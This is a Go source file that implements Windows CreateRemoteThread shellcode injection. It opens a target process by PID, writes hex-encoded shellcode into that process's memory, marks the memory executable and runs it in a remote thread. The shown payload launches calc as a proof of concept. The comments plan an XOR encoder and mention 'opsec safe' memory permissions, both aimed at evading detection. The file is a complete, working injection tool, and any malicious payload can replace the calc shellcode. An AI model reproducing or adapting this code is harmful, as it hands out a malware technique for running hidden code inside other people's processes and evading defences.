/*
	8/25/2020

	CreateRemoteThread shellcode injection technique

	currently pops shellcode for calc


	METHOD:

			1. OpenProcess to get handle to PID with CREATE_THREAD_ACCESS (see below)
			2. VirtualAllocEx to create/reserve a read-write page in memory
			3. WriteProcessMemory copies shellcode to address of rw page
			4. VirtualProtectEx adjusts page to allow execution
			5. CreateRemoteThread kicks off execution


	TODO:

		XOR encoder for shellcode
		Refactor code to "functions"

	BUILD:

		go build createremotethread.go -o goCreateRemoteThread.exe

		I like to use notepad to test



	THIS WORKS!!!

	inspired by https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateRemoteThread/main.go

	hoping to use this as a jumping off poiint to learn process injection techniques in golang
*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE    = 0x04
	PAGE_EXECUTE_READ = 0x20
)

func main() {

	//ARGS

	verbose := flag.Bool("verbose", false, "Enable verbose output")
	pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
	flag.Parse()

	// Pop Calc Shellcode - SOLID SHELLCODE POC
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	//Opening process handle - OpenProcess
	pHandle, errOpenProcess := windows.OpenProcess(CREATE_THREAD_ACCESS, false, uint32(*pid))

	if errOpenProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *pid))
	}

	//Allocating memory in process - VirtualAllocEx
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *pid))
	}

	//Writing shellcode into allocated memory - WriteProcessMemory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *pid))
	}

	//Modifying permissions from RW to RX - VirtualProtectEx (RWX is bad and not opsec safe)
	rw := PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&rw)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
	}

	//Calling shellcode in memory - CreateRemoteThread
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *pid))
	}

	//close handle to process
	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
	}

}
